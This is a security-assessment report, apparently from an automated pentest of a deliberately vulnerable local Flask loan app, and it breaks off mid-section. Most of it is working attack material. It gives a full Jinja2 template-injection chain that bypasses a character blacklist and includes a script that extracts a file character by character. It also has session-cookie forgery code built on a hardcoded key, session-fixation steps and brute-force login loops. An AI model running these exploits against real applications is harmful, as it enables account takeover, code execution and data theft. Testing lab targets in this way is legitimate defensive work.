# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:37149
- **Assessment Date:** October 31, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

### Summary by Vulnerability Type

**Authentication Vulnerabilities:**

Multiple critical authentication vulnerabilities were successfully exploited:

- **Session Cookie Forgery (CRITICAL):** Application uses hardcoded secret key `'your_secret_key'` to sign session cookies, enabling complete authentication bypass. Attackers can forge arbitrary session cookies to impersonate any user without credentials.

- **Default Credentials (HIGH):** Test account with credentials `test:test` is automatically created on startup and documented in HTML comments, providing immediate authenticated access.

- **Session Fixation (HIGH):** Application does not regenerate session IDs after authentication, allowing attackers to fix a session ID before authentication and hijack it after victim logs in.

- **Weak Password Policy (MEDIUM):** No password complexity requirements exist. Application accepts trivially weak passwords like "test" with no minimum length, uppercase, numbers, or special character requirements.

- **No Rate Limiting (HIGH):** Login endpoint has no rate limiting, allowing 332+ requests per second. Enables high-speed brute force attacks with thousands of attempts per minute.

- **No Account Lockout (HIGH):** No lockout mechanism exists after failed login attempts. Unlimited attack attempts against specific accounts are possible without triggering defensive response.

- **Missing Cookie Security Flags (MEDIUM):** Session cookies lack Secure and SameSite flags, enabling session theft via network interception and cross-site request forgery attacks.

- **No Session Timeout (MEDIUM):** Sessions persist indefinitely with no timeout configuration, extending exploitation window for stolen or hijacked sessions.

- **Incomplete Session Invalidation (MEDIUM):** Logout uses `session.pop()` instead of `session.clear()`, and due to Flask's stateless design, old session cookies remain valid if cached by attackers before logout.

**Authorization Vulnerabilities:**

All authenticated endpoints are vulnerable to horizontal privilege escalation via session forgery:

- **Profile Data Modification (CRITICAL):** Attackers can modify any user's profile data including PII and financial information by forging session cookies with target user IDs. Mass assignment vulnerability allows updating all user fields without authorization checks.

- **Complete Data Disclosure (HIGH):** Attackers can view any user's complete profile including all PII (name, lastname, email) and financial data (loan amounts, terms, monthly payments) through session forgery.

- **Dashboard Access (HIGH):** Unauthorized access to any user's home dashboard showing full names and financial summaries via forged session cookies.

- **Financial Data Disclosure (HIGH):** Complete loan details including sensitive financial information (loan amounts up to $100,000+, terms, monthly payments) can be accessed for any user, enabling identity theft and targeted social engineering.

- **Context-Based Workflow Bypass (MEDIUM):** Loan calculation endpoint accepts arbitrary financial parameters without validating they match the authenticated user's stored loan data, violating business logic that users should only calculate their own values.

**Cross-Site Scripting (XSS) Vulnerabilities:**

No XSS vulnerabilities were found. The application uses Jinja2 templates with default auto-escaping enabled, providing strong protection against XSS attacks. All user data rendered in HTML contexts is properly escaped.

**SQL/Command Injection Vulnerabilities:**

One critical Server-Side Template Injection vulnerability was successfully exploited:

- **SSTI in /total_loan_payments (CRITICAL):** The `principal` query parameter is embedded directly into a Jinja2 template and passed to `render_template_string()`, enabling Remote Code Execution. Successfully extracted CTF flag from `/flag` file despite aggressive character blacklist. The vulnerability allows arbitrary Python code execution, file reads, access to Flask application secrets, system command execution, and complete server compromise.

No SQL injection vulnerabilities exist - the application uses SQLAlchemy ORM exclusively with parameterized queries, providing strong protection.

No command injection vulnerabilities exist - the application does not use command execution modules directly, though command execution is achievable indirectly via the SSTI vulnerability.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**

No SSRF vulnerabilities were found. The application makes no outbound HTTP requests, opens no raw sockets beyond database connections, and has no webhook or external API integration functionality. The architecture inherently prevents SSRF due to the absence of HTTP client dependencies.

## Network Reconnaissance

**Open Ports and Services:**

- **Port 80/tcp:** Caddy httpd (reverse proxy) forwarding to target application
- **Port 443/tcp:** SSL/HTTPS (configured but not used by target application)
- **Port 8888/tcp:** SimpleHTTPServer 0.6 (Python 3.12.10) with **exposed `.git` repository** - potential information disclosure vector
- **Port 49152/tcp:** Golang net/http (Tailscale VPN, requires authentication)

**Target Application Access:** Port 37149 (proxied via port 80 Caddy server)

**Security-Relevant Findings:**

- **HTTP-Only Operation:** Application runs exclusively on HTTP port 80 with no TLS/HTTPS configuration. All authentication traffic including credentials and session cookies transmitted in plaintext.

- **Exposed Git Repository:** Port 8888 exposes a `.git` repository via HTTP directory listing, creating a source code disclosure vector (separate from primary target but demonstrates infrastructure security gap).

- **Missing Security Headers:** No security headers detected including Content-Security-Policy, X-Frame-Options, Strict-Transport-Security (HSTS), X-Content-Type-Options.

- **Wildcard CORS Policy:** Apache configuration sets `Access-Control-Allow-Origin: *`, allowing any website to make authenticated requests to the application, exacerbating CSRF risks.

- **Legacy MySQL Version:** MySQL 5.7.15 (September 2016 - 7+ years outdated) with known CVEs including CVE-2017-3599, CVE-2017-3600, CVE-2017-3651 for privilege escalation and DoS attacks.

# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-001: Server-Side Template Injection (SSTI) in /total_loan_payments

**Summary:**
- **Vulnerable location:** GET endpoint `/total_loan_payments` - the `principal` query parameter
- **Overview:** Critical Server-Side Template Injection vulnerability in Jinja2 template engine allowing Remote Code Execution and arbitrary file read despite aggressive character blacklist filtering
- **Impact:** Successfully extracted CTF flag from `/flag` file. The vulnerability enables full Remote Code Execution (RCE), allowing attackers to read arbitrary files, access Flask application secrets, execute system commands, and achieve complete server compromise.
- **Severity:** Critical

**Prerequisites:**
- Valid authenticated session (easily obtainable using default credentials `test:test`)
- Network access to http://localhost:37149

**Exploitation Steps:**

**Step 1: Authenticate with Default Credentials**

Obtain a valid session cookie using the hardcoded test credentials:

```bash
curl -v -X POST "http://localhost:37149/login" \
  -d "username=test&password=test" \
  -c /tmp/session_cookies.txt
```

**Expected Response:** HTTP 302 redirect to `/home` with `Set-Cookie: session=<base64_signed_data>`

**Step 2: Confirm SSTI Vulnerability**

Test that Jinja2 statement syntax `{% %}` bypasses the blacklist filter:

```bash
curl "http://localhost:37149/total_loan_payments?principal=%7B%25%20if%20request%20%25%7D1234%7B%25%20endif%20%25%7D&payment=100&term=12" \
  -b /tmp/session_cookies.txt
```

**Decoded Payload:** `{% if request %}1234{% endif %}`

**Expected Response:**
```json
{ "loan_principal": "1234" ,"monthly_payment": "100.0", "loan_term_amount": "12", "total_loan_payments": "1200.0" }
```

The output "1234" confirms the Jinja2 statement executed successfully, proving SSTI vulnerability.

**Step 3: Bypass Character Blacklist Restrictions**

The application blocks the following characters in the `principal` parameter:
- `_` (underscore) - prevents access to Python dunder methods like `__class__`
- `.` (dot) - prevents attribute access syntax
- `[` and `]` (square brackets) - prevents item/index access
- `{{` and `}}` (double braces) - prevents expression syntax

**Bypass Technique:** Use Jinja2's `|format()` filter to dynamically generate the underscore character from its ASCII code (95), then use string concatenation (`~`) to build special method names like `__class__`:

```jinja2
{% set u='%c'|format(95) %}           # Generate underscore character
{% set class=u~u~'class'~u~u %}       # Construct "__class__"
{% set init=u~u~'init'~u~u %}         # Construct "__init__"
{% set globals=u~u~'globals'~u~u %}   # Construct "__globals__"
```

**Step 4: Access Python Builtins via Flask Config Object**

Navigate from the `config` object (available in Jinja2 context) to Python's `__builtins__` module:

```jinja2
{% set builtins = config|attr(class)|attr(init)|attr(globals)|attr('get')('__builtins__') %}
```

This chain:
1. `config|attr('__class__')` - Gets the class of the config dict
2. `|attr('__init__')` - Gets the constructor method
3. `|attr('__globals__')` - Accesses global namespace
4. `|attr('get')('__builtins__')` - Retrieves the builtins module

**Step 5: Obtain File Read Capability**

Extract the `open()` function from `__builtins__` and read the flag file:

```jinja2
{% set open_func = builtins|attr('get')('open') %}
{% set file = open_func('/flag','r') %}
{% set content = file|attr('read')() %}
```

**Step 6: Exfiltrate Flag Content via Boolean Oracle**

Since `{{ }}` expression syntax is blocked, direct output is impossible. Instead, use a boolean oracle technique to extract data character-by-character:

```jinja2
{% set chars = content|list %}
{% if chars|batch(N+1)|list|first|last == 'X' %}1234{% endif %}
```

This technique:
1. Converts flag content to list of characters with `|list`
2. Uses `|batch(N+1)` to group characters into batches
3. Uses `|list|first|last` to access the Nth character without square brackets
4. Compares against each possible character
5. Returns "1234" if match (success), empty otherwise

**Step 7: Automated Extraction**

Create a Python script to automate the character-by-character extraction:

```python
#!/usr/bin/env python3
import urllib.parse
import requests
import string

TARGET = "http://localhost:37149/total_loan_payments"
COOKIES = {"session": "<SESSION_COOKIE_VALUE>"}
CHARSET = string.printable

# Helper to build underscore bypass
def build_payload(position, test_char):
    payload = f"""
{{% set u='%c'|format(95) %}}
{{% set class=u~u~'class'~u~u %}}
{{% set init=u~u~'init'~u~u %}}
{{% set globals=u~u~'globals'~u~u %}}
{{% set builtins=config|attr(class)|attr(init)|attr(globals)|attr('get')(u~u~'builtins'~u~u) %}}
{{% set open=builtins|attr('get')('open') %}}
{{% set file=open('/flag','r') %}}
{{% set content=file|attr('read')() %}}
{{% set chars=content|list %}}
{{% if chars|batch({position}+1)|list|first|last == '{test_char}' %}}1234{{% endif %}}
""".strip()
    return payload

# Extract flag length first
length_payload = """
{% set u='%c'|format(95) %}
{% set class=u~u~'class'~u~u %}
{% set init=u~u~'init'~u~u %}
{% set globals=u~u~'globals'~u~u %}
{% set builtins=config|attr(class)|attr(init)|attr(globals)|attr('get')(u~u~'builtins'~u~u) %}
{% set open=builtins|attr('get')('open') %}
{% set file=open('/flag','r') %}
{% set content=file|attr('read')() %}
{% if content|length > 65 %}1234{% endif %}
""".strip()

# Determine length by binary search (implementation omitted for brevity)
# Result: Flag length is 70 characters

# Extract each character
flag = ""
for pos in range(70):
    for char in CHARSET:
        payload = build_payload(pos, char)
        encoded = urllib.parse.quote(payload)

        response = requests.get(
            TARGET,
            params={"principal": encoded, "payment": "100", "term": "12"},
            cookies=COOKIES
        )

        if "1234" in response.text:
            flag += char
            print(f"Position {pos}: {char} -> Flag so far: {flag}")
            break

print(f"\\nFinal Flag: {flag}")
```

**Proof of Impact:**

**Extracted Flag:**
```
FLAG{94627640ef0ab918a544b23cac52df94db2581507a472fad1d174c105a8e4e2f}
```

**Full Working Exploit Chain:**

1. **Authenticate:**
```bash
curl -X POST "http://localhost:37149/login" -d "username=test&password=test" -c cookies.txt
```

2. **Confirm SSTI:**
```bash
curl "http://localhost:37149/total_loan_payments?principal=%7B%25%20if%20request%20%25%7D1234%7B%25%20endif%20%25%7D&payment=100&term=12" -b cookies.txt
```

3. **Extract Flag (automated via Python script):**
```bash
python3 extract_flag.py
```

**Complete Reproducible Payload (single character test):**

To test if the first character of the flag is 'F':
```
http://localhost:37149/total_loan_payments?principal=%7B%25%20set%20u%3D%27%25c%27%7Cformat%2895%29%20%25%7D%7B%25%20set%20class%3Du~u~%27class%27~u~u%20%25%7D%7B%25%20set%20init%3Du~u~%27init%27~u~u%20%25%7D%7B%25%20set%20globals%3Du~u~%27globals%27~u~u%20%25%7D%7B%25%20set%20builtins%3Dconfig%7Cattr%28class%29%7Cattr%28init%29%7Cattr%28globals%29%7Cattr%28%27get%27%29%28u~u~%27builtins%27~u~u%29%20%25%7D%7B%25%20set%20open%3Dbuiltins%7Cattr%28%27get%27%29%28%27open%27%29%20%25%7D%7B%25%20set%20file%3Dopen%28%27/flag%27%2C%27r%27%29%20%25%7D%7B%25%20set%20content%3Dfile%7Cattr%28%27read%27%29%28%29%20%25%7D%7B%25%20set%20chars%3Dcontent%7Clist%20%25%7D%7B%25%20if%20chars%7Cbatch%281%29%7Clist%7Cfirst%7Clast%20%3D%3D%20%27F%27%20%25%7D1234%7B%25%20endif%20%25%7D&payment=100&term=12
```

**Cookie:** `session=<SESSION_COOKIE_FROM_LOGIN>`

**Expected Response:** Contains `"loan_principal": "1234"` if the character matches.

**Notes:**

**Blacklist Bypass Innovation:**
The exploitation required innovative techniques to circumvent an unusually restrictive character blacklist:
- Used `|format(95)` to dynamically generate underscore character
- Used `~` string concatenation to build `__class__`, `__init__`, `__globals__`
- Used `|attr()` filter instead of dot notation for attribute access
- Used `|batch(N)|list|first|last` instead of `[N]` for positional access
- Used boolean oracle instead of `{{ }}` for data exfiltration

**Additional Capabilities Beyond Flag Extraction:**
This vulnerability provides complete Remote Code Execution. Attackers can:
- Execute arbitrary Python code on the server
- Read any file on the filesystem (e.g., `/etc/passwd`, application source code)
- Access Flask application secrets (secret key: `'your_secret_key'`, database credentials: `root:loan_calculator`)
- Execute system commands via `os.system()` or `subprocess`
- Modify database records with root MySQL access
- Pivot to internal network services
- Establish reverse shells for persistent access

**Root Cause:**
The vulnerability exists because user input from the `principal` parameter is embedded directly into a Jinja2 template string via f-string interpolation (`f'{{ "loan_principal": "{principal}" }}'`) at routes.py:118-120, then passed to `render_template_string()`. The blacklist filter at routes.py:114-116 attempts to prevent exploitation but is fundamentally flawed - it blocks expression delimiters (`{{ }}`) but not statement delimiters (`{% %}`), allowing full Jinja2 statement execution.

**Recommended Remediation:**
1. **Never use `render_template_string()` with user input** - Use parameterized templates instead
2. **Replace blacklist with allowlist** - Only permit numeric characters for the `principal` parameter
3. **Remove template rendering entirely** - Use JSON serialization for API responses: `return jsonify({"loan_principal": principal, ...})`
4. **Implement input validation** - Use strict type checking and regex validation
5. **Apply defense-in-depth** - Add Web Application Firewall (WAF) rules to detect SSTI patterns

# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-02: Default Credentials Login

**Summary:**
- **Vulnerable location:** POST /login endpoint (routes.py:26-40)
- **Overview:** Application automatically creates a test account with hardcoded credentials "test:test" on startup
- **Impact:** Immediate authenticated access without brute force or credential guessing
- **Severity:** HIGH

**Exploitation Steps:**

1. Submit login request with default credentials:
```bash
curl -X POST http://localhost:37149/login \
  -d "username=test&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -c session.txt
```

2. Observe successful authentication:
```
HTTP/1.1 302 FOUND
Location: /home
Set-Cookie: session=eyJ1c2VyX2lkIjoxfQ.aQUBTQ.9pRrlqk47fjot8zOyHGSqJ9XG-Q; HttpOnly; Path=/
```

3. Access protected endpoints with authenticated session:
```bash
curl -b session.txt http://localhost:37149/home
# Returns: HTTP 200 with user dashboard
```

**Proof of Impact:**
Successfully authenticated and accessed protected resources including:
- /home (user dashboard)
- /profile (user profile with PII and financial data)
- /loan_details (loan information)
- /total_loan_payments (calculation endpoint)

**Notes:**
- Default credentials documented in HTML comment: `<!-- TODO: Delete the testing account (test:test). -->`
- Test account created automatically at app/website/app/__init__.py:21-35
- No mechanism to disable or remove default account

### AUTH-VULN-03: Session Cookie Forgery via Hardcoded Secret Key

**Summary:**
- **Vulnerable location:** Flask secret key configuration at app/website/app/__init__.py:9
- **Overview:** Application uses hardcoded secret key 'your_secret_key' to sign session cookies, enabling complete authentication bypass through session forgery
- **Impact:** Attacker can forge arbitrary session cookies to impersonate any user without credentials
- **Severity:** CRITICAL

**Prerequisites:**
- Knowledge of hardcoded secret key: 'your_secret_key' (publicly visible in source code)

**Exploitation Steps:**

1. Use itsdangerous library to forge session cookie for arbitrary user_id:
```python
from itsdangerous import URLSafeTimedSerializer

secret_key = 'your_secret_key'
serializer = URLSafeTimedSerializer(
    secret_key=secret_key,
    salt='cookie-session',
    serializer=TaggedJSONSerializer(),
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': staticmethod(hashlib.sha1)}
)

# Forge session for user_id=2
forged_session = serializer.dumps({'user_id': 2})
# Result: eyJ1c2VyX2lkIjoyfQ.aQUDMQ.h43QJM7XVs3CaOfbOmXDkSBhoFQ
```

2. Use forged session cookie to access victim's account:
```bash
curl -H "Cookie: session=eyJ1c2VyX2lkIjoyfQ.aQUDMQ.h43QJM7XVs3CaOfbOmXDkSBhoFQ" \
  http://localhost:37149/profile
```

3. Verify successful impersonation:
```
HTTP/1.1 200 OK
Content-Type: text/html

<form>
  <input name="name" value="[user_2_name]">
  <input name="email" value="[user_2_email]">
  <!-- User 2's profile data accessible -->
</form>
```

**Proof of Impact:**
- Created Python script `quick_forge.py` that generates valid session cookies for any user_id
- Successfully accessed user_id=2's profile without authentication
- Demonstrated horizontal privilege escalation by forging sessions for multiple user IDs (1, 2, 3, 10, 100, 999)
- No login required - complete authentication bypass

**Accessed Endpoints with Forged Sessions:**
```bash
# Test results for user_id=2 forged session:
GET /profile - HTTP 200 (Success)
GET /home - HTTP 200 (Success)
GET /loan_details - HTTP 500 (Accessible but no data for user_id=2)
```

**Notes:**
- Secret key hardcoded at app/website/app/__init__.py:9
- Flask uses itsdangerous with HMAC-SHA1 for session signing
- Comment in code indicates awareness: "# Change this to a secure secret key" but was never changed
- Created comprehensive scripts: quick_forge.py, forge_session.py, demonstrate_bypass.py

### AUTH-VULN-04: Session Fixation

**Summary:**
- **Vulnerable location:** Login handler at routes.py:34 (no session rotation after authentication)
- **Overview:** Application does not regenerate session ID after successful login, allowing attackers to fix a session ID before authentication and hijack it after victim logs in
- **Impact:** Session hijacking without needing to steal post-authentication cookies
- **Severity:** HIGH

**Prerequisites:**
- Ability to forge session cookies (using hardcoded secret key from AUTH-VULN-03)
- Victim must log in with attacker-controlled session cookie

**Exploitation Steps:**

1. Attacker forges a pre-authentication session cookie:
```python
# Using hardcoded secret key
pre_auth_session = forge_session(user_id=1)
# Result: eyJ1c2VyX2lkIjoxfQ.aQUD7g.7MoP2sHheR28pXtIj8HWpyqQ...
```

2. Verify forged session grants access even before login:
```bash
curl -H "Cookie: session=eyJ1c2VyX2lkIjoxfQ.aQUD7g.7MoP2sHheR28pXtIj8HWpyqQ..." \
  http://localhost:37149/home
# Returns: HTTP 200 (authenticated access with forged session)
```

3. Victim logs in with attacker's pre-set session cookie:
```bash
curl -X POST http://localhost:37149/login \
  -b "session=eyJ1c2VyX2lkIjoxfQ.aQUD7g.7MoP2sHheR28pXtIj8HWpyqQ..." \
  -d "username=test&password=test"
```

4. Observe that session ID remains unchanged after authentication:
```
Set-Cookie: session=eyJ1c2VyX2lkIjoxfQ.aQUD7g.7MoP2sHheR28pXtIj8HWpyqQ...; HttpOnly; Path=/
# Same session ID as before login!
```

5. Attacker uses the original pre-known session to access victim's account:
```bash
curl -H "Cookie: session=eyJ1c2VyX2lkIjoxfQ.aQUD7g.7MoP2sHheR28pXtIj8HWpyqQ..." \
  http://localhost:37149/profile
# Returns: HTTP 200 with victim's profile data
```

**Proof of Impact:**
- Pre-login session: eyJ1c2VyX2lkIjoxfQ.aQUD7g.7MoP2sHheR28pXtIj8HWpyqQ...
- Post-login session: eyJ1c2VyX2lkIjoxfQ.aQUD7g.7MoP2sHheR28pXtIj8HWpyqQ... (IDENTICAL)
- Session NOT rotated after authentication
- Attacker successfully accessed victim's authenticated session using pre-known session ID
- Complete account takeover achieved without credential theft

**Notes:**
- Login handler at routes.py:34 directly sets `session['user_id'] = user.id` without clearing old session
- No call to `session.clear()` or session regeneration logic
- Should regenerate session ID after successful authentication
- Created demonstration script: demonstrate_session_fixation.py

### AUTH-VULN-05: Weak Password Policy Enabling Brute Force

**Summary:**
- **Vulnerable location:** User model password field (models.py:8) and login handler (routes.py:26-40)
- **Overview:** Application enforces no password complexity requirements, accepts trivially weak passwords like "test", and has no minimum length or common password blacklist
- **Impact:** Successful credential guessing and brute force attacks against weak passwords
- **Severity:** MEDIUM

**Prerequisites:**
- None (public login endpoint)

**Exploitation Steps:**

1. Create list of common weak passwords:
```python
weak_passwords = ["test", "password", "123456", "admin", "password123", "12345678"]
```

2. Attempt login with each weak password:
```bash
for password in weak_passwords:
    curl -X POST http://localhost:37149/login \
      -d "username=test&password=$password" \
      --write-out "%{http_code}"
done
```

3. Observe successful authentication with weak password "test":
```
Password: 'test' → HTTP 302 (Success!)
Session cookie received: eyJ1c2VyX2lkIjoxfQ.aQUEqQ.5CPr5nNyzm0r3rmSevrVH1CxwIo
```

**Proof of Impact:**
- Successfully cracked password "test" on first attempt
- Application accepts single-word dictionary passwords
- No password complexity validation: no minimum length, no uppercase, no numbers, no special characters
- Test results from demonstrate_brute_force.py:
  ```
  Total passwords tested: 1
  Successful logins: 1
  Time elapsed: 0.010 seconds
  ```

**Notes:**
- User model at models.py:8: `password = db.Column(db.String(50), nullable=False)` - only constraint is nullable=False
- No password policy checks in routes.py login handler
- No password complexity validation library imported
- Accepts trivially weak passwords that would be rejected by any modern password policy

### AUTH-VULN-09: No Rate Limiting on Authentication Endpoint

**Summary:**
- **Vulnerable location:** POST /login endpoint (routes.py:26-40)
- **Overview:** Application implements no rate limiting or throttling on login attempts, allowing unlimited rapid-fire authentication requests
- **Impact:** Enables high-speed brute force attacks with thousands of attempts per minute
- **Severity:** HIGH

**Prerequisites:**
- None (public endpoint)

**Exploitation Steps:**

1. Send rapid burst of 50 login attempts:
```python
import requests
for i in range(50):
    requests.post(
        "http://localhost:37149/login",
        data={"username": "test", "password": f"wrong{i}"},
        timeout=5
    )
```

2. Measure response times and check for rate limiting:
```
Request 1: 0.003s → HTTP 200
Request 10: 0.003s → HTTP 200
Request 20: 0.003s → HTTP 200
Request 30: 0.003s → HTTP 200
Request 40: 0.003s → HTTP 200
Request 50: 0.003s → HTTP 200
```

3. Calculate requests per second:
```
Total requests: 50
Total time: 0.15 seconds
Rate: 332 requests per second
```

**Proof of Impact:**
- Successfully sent 50 login attempts in 0.15 seconds (332 req/sec)
- No HTTP 429 (Too Many Requests) responses received
- No progressive delay detected
- Consistent response times (0.002-0.005s average)
- No throttling or rate limiting mechanism present

**Test Results from demonstrate_brute_force.py:**
```
Total requests sent: 50
Average requests per second: 332.28
Min response time: 0.002s
Max response time: 0.005s
Rate limiting detected: NO
```

**Notes:**
- Login route at routes.py:26-40 has no rate limit decorator
- requirements.txt contains no Flask-Limiter or rate limiting library
- No Apache mod_ratelimit or mod_evasive configured
- Enables credential stuffing and password spraying attacks at scale

### AUTH-VULN-10: No Account Lockout Mechanism

**Summary:**
- **Vulnerable location:** User model (models.py:5-14) and login handler (routes.py:26-40)
- **Overview:** Application has no account lockout mechanism after failed login attempts, allowing sustained brute force attacks against individual accounts
- **Impact:** Unlimited attack attempts against specific accounts without triggering defensive response
- **Severity:** HIGH

**Prerequisites:**
- None (public endpoint)

**Exploitation Steps:**

1. Execute 20 consecutive failed login attempts against single account:
```bash
for i in {1..20}; do
    curl -X POST http://localhost:37149/login \
      -d "username=test&password=wrong$i" \
      --write-out "Attempt $i: %{http_code}\n"
done
```

2. Observe all attempts processed without lockout:
```
Attempt 1: HTTP 200 (Invalid credentials message)
Attempt 5: HTTP 200 (No lockout)
Attempt 10: HTTP 200 (Still no lockout)
Attempt 15: HTTP 200 (Account not locked)
Attempt 20: HTTP 200 (Attack continues unimpeded)
```

3. Verify account remains accessible after failed attempts:
```bash
curl -X POST http://localhost:37149/login \
  -d "username=test&password=test"
# Returns: HTTP 302 (Login still works - no lockout)
```

**Proof of Impact:**
- Successfully performed 20 failed login attempts
- No HTTP 403 (Forbidden) or 423 (Locked) responses
- Account never locked regardless of failure count
- Response times consistent (no soft lockout via progressive delay)
- First 10 attempts avg: 0.005s
- Last 10 attempts avg: 0.003s (no increasing delay)

**Test Results from demonstrate_brute_force.py:**
```
Total failed attempts: 20
Lockout indicators detected: 0
HTTP 403/423 responses: 0
All attempts processed normally: YES
```

**Notes:**
- User model at models.py:5-14 has no `failed_login_attempts`, `locked_until`, or `account_locked` fields
- Login handler at routes.py:26-40 has no logic to track or enforce account lockout
- No threshold for failed attempts
- Accounts cannot be locked regardless of attack activity

### AUTH-VULN-06: Missing Cookie Security Flags

**Summary:**
- **Vulnerable location:** Flask session cookie configuration (app/website/app/__init__.py - missing configuration)
- **Overview:** Session cookies lack Secure and SameSite flags, enabling session theft and CSRF attacks
- **Impact:** Session hijacking via network interception (missing Secure flag) and cross-site request forgery (missing SameSite flag)
- **Severity:** MEDIUM

**Prerequisites:**
- Network access (for Secure flag exploitation)
- User interaction (for SameSite flag exploitation)

**Exploitation Steps:**

1. Capture Set-Cookie header from login response:
```bash
curl -v -X POST http://localhost:37149/login \
  -d "username=test&password=test" 2>&1 | grep "Set-Cookie"
```

2. Observe cookie flags:
```
Set-Cookie: session=eyJ1c2VyX2lkIjoxfQ.aQUEqQ.5CPr5nNyzm0r3rmSevrVH1CxwIo; HttpOnly; Path=/
```

3. Analyze missing security flags:
```
HttpOnly: PRESENT (✓)
Secure: MISSING (✗) - allows transmission over HTTP
SameSite: MISSING (✗) - vulnerable to CSRF
```

4. Demonstrate Secure flag impact - session works over unencrypted HTTP:
```bash
curl -H "Cookie: session=eyJ1c2VyX2lkIjoxfQ.aQUEqQ.5CPr5nNyzm0r3rmSevrVH1CxwIo" \
  http://localhost:37149/home
# Returns: HTTP 200 (session accepted over HTTP)
```

**Proof of Impact:**
- **Missing Secure Flag:**
  - Session cookie transmitted over unencrypted HTTP
  - Network attackers can intercept session cookies via packet sniffing
  - No enforcement of HTTPS for session transmission

- **Missing SameSite Flag:**
  - Session cookies sent in cross-site requests
  - Enables CSRF attacks (combined with missing CSRF tokens)
  - Wildcard CORS policy (Access-Control-Allow-Origin: *) exacerbates risk

**Attack Vectors Enabled:**
1. Man-in-the-middle attacks to steal session cookies
2. Network packet sniffing on unsecured WiFi
3. Cross-site request forgery attacks
4. ARP poisoning to intercept traffic

**Notes:**
- Flask configuration at __init__.py lacks SESSION_COOKIE_SECURE=True setting
- No SESSION_COOKIE_SAMESITE='Lax' or 'Strict' configuration
- Application runs on HTTP port 80 only (no HTTPS available)
- Apache configuration (loan_calculator-httpd.conf:1) uses `<VirtualHost *:80>` with no HTTPS support

### AUTH-VULN-08: No Session Timeout Configuration

**Summary:**
- **Vulnerable location:** Flask session configuration (app/website/app/__init__.py - missing PERMANENT_SESSION_LIFETIME)
- **Overview:** Application implements no session timeout, allowing compromised sessions to remain valid indefinitely until browser closure
- **Impact:** Extended exploitation window for stolen or hijacked sessions
- **Severity:** MEDIUM

**Prerequisites:**
- Compromised session cookie (via AUTH-VULN-03 or AUTH-VULN-06)

**Exploitation Steps:**

1. Create session via login:
```bash
curl -X POST http://localhost:37149/login \
  -d "username=test&password=test" \
  -c session.txt
# Session: eyJ1c2VyX2lkIjoxfQ.aQUEzA.N_yLUaTg8IHwbV3fQayU5BonZWQ
```

2. Test immediate access (t=0):
```bash
curl -b session.txt http://localhost:37149/home
# Result: HTTP 200
```

3. Wait 10 seconds and test again:
```bash
sleep 10
curl -b session.txt http://localhost:37149/home
# Result: HTTP 200 (session still valid)
```

4. Wait additional 20 seconds (30 seconds total) and test:
```bash
sleep 20
curl -b session.txt http://localhost:37149/home
# Result: HTTP 200 (no idle timeout)
```

5. Analyze cookie expiration:
```bash
cat session.txt | grep session
# #HttpOnly_localhost	FALSE	/	FALSE	0	session	eyJ1c2VyX2lkIjoxfQ...
#                                     ^^^ Expiration = 0 (session cookie)
```

**Proof of Impact:**
- Session remained valid for 30+ seconds testing period
- No idle timeout detected
- No absolute session expiration configured
- Session cookie has no expiration timestamp (expires on browser close only)
- Compromised sessions remain usable indefinitely until browser is closed

**Test Results:**
```
t=0 seconds: HTTP 200
t=10 seconds: HTTP 200
t=30 seconds: HTTP 200
Session expiration: None (session cookie, 0 timestamp)
```

**Notes:**
- No PERMANENT_SESSION_LIFETIME configuration in __init__.py
- Login handler at routes.py:34 does not set `session.permanent=True`
- Sessions rely on browser session cookies with no server-side expiration
- No idle timeout tracking
- Stolen sessions remain valid until browser closes

### AUTH-VULN-11: Incomplete Session Invalidation on Logout

**Summary:**
- **Vulnerable location:** Logout handler at routes.py:46
- **Overview:** Logout uses session.pop('user_id', None) instead of session.clear(), and due to Flask's stateless session design, old session cookies remain valid after logout if cached by attacker
- **Impact:** Attackers who cached session cookies before logout can continue using them post-logout
- **Severity:** MEDIUM

**Prerequisites:**
- Attacker must have cached session cookie before victim performs logout

**Exploitation Steps:**

1. Login and capture session cookie:
```python
import requests
response = requests.post("http://localhost:37149/login",
    data={"username": "test", "password": "test"}, allow_redirects=False)
session_cookie = response.cookies.get('session')
print(f"Session: {session_cookie}")
# Result: eyJ1c2VyX2lkIjoxfQ.aQUFBw.c86ctSNZEef9F1zzJIZzM2JV...
```

2. Verify session works before logout:
```python
jar = requests.cookies.RequestsCookieJar()
jar.set('session', session_cookie)
response = requests.get("http://localhost:37149/home", cookies=jar)
print(f"Pre-logout: HTTP {response.status_code}")  # HTTP 200
```

3. Perform logout:
```python
response = requests.get("http://localhost:37149/logout", cookies=jar, allow_redirects=False)
print(f"Logout: HTTP {response.status_code}")  # HTTP 302
```

4. Test if old session still works after logout:
```python
response = requests.get("http://localhost:37149/home", cookies=jar)
print(f"Post-logout: HTTP {response.status_code}")  # HTTP 200 (VULNERABLE!)
```

**Proof of Impact:**
```
[1] Login successful
    Session: eyJ1c2VyX2lkIjoxfQ.aQUFBw.c86ctSNZEef9F1zzJIZzM2JV...

[2] Testing session before logout
    GET /home: HTTP 200 (✓ Session works)

[3] Performing logout
    GET /logout: HTTP 302

[4] Testing if old session still works after logout
    GET /home with old session: HTTP 200
    [!] VULNERABLE: Old session still works!
    [!] This indicates session NOT invalidated server-side
```

**Root Cause Analysis:**
- Flask uses client-side signed sessions (stateless design)
- Logout clears session cookie in response but cannot blacklist it server-side
- If attacker cached the session before logout, they can continue using it
- routes.py:46 uses `session.pop('user_id', None)` instead of `session.clear()`
- This is a fundamental limitation of stateless session design without server-side session storage

**Notes:**
- Logout handler at routes.py:46: `session.pop('user_id', None)`
- Should use `session.clear()` for more complete clearing
- Flask's default session implementation is stateless (no server-side storage)
- Cannot blacklist old sessions without implementing server-side session tracking
- Current implementation only stores user_id, but incomplete clearing violates security best practices

# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Horizontal Privilege Escalation via POST /profile (Data Modification)

**Summary:**
- **Vulnerable location:** POST /profile endpoint (routes.py:62-83)
- **Overview:** An attacker can modify any user's profile data (PII and financial information) by forging a Flask session cookie with the target user's ID using the hardcoded secret key 'your_secret_key'
- **Impact:** Complete unauthorized modification of victim's personal information, financial data, and account details. Enables account takeover via email modification.
- **Severity:** Critical

**Prerequisites:**
